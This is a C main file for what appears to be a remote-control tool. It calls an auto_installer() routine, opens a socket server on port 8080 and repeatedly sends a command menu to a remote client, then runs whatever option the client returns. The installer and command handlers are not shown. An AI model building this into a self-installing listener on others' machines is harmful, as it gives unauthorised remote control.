#ifdef _WIN32
#include <winsock2.h>
#else
#include <sys/socket.h>
#include <unistd.h>
#endif
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "handler/handler.h"
#include "libs/socket/socket.h"
#include "handler/setup/setup.h"

int main() {
  bool connected;
  char buffer[32] = {0};
  int client;
  int sock;
  int error;

  auto_installer();

  // Start socket server at port 8080
  error = init_socket(&client, &sock, 8080);
  if (error < 0)
    return -1;
  connected = true;

  // While user does not choose 'Exit'
  do {
    // Send options to message
    error = send_socket(client, get_commands());
    if (error < 0) {
      close_socket(client, sock);
      connected = false;
    }

    // Get message sended from client
    error = receive_socket(client, buffer);
    if (error < 0) {
      close_socket(client, sock);
      connected = false;
    }

    // Handle user option
    error = run_command(buffer);
    if (error < 0) {
      error = send_socket(client, "[!] Invalid option");
      if (error < 0) {
        close_socket(client, sock);
        connected = false;
      }
    }
    if (error == 1) {
      close_socket(client, sock);
      connected = false;
    }

    // Clear variable value from memory
    memset(buffer, 0, sizeof(buffer));
  } while (connected);
  return 0;
}
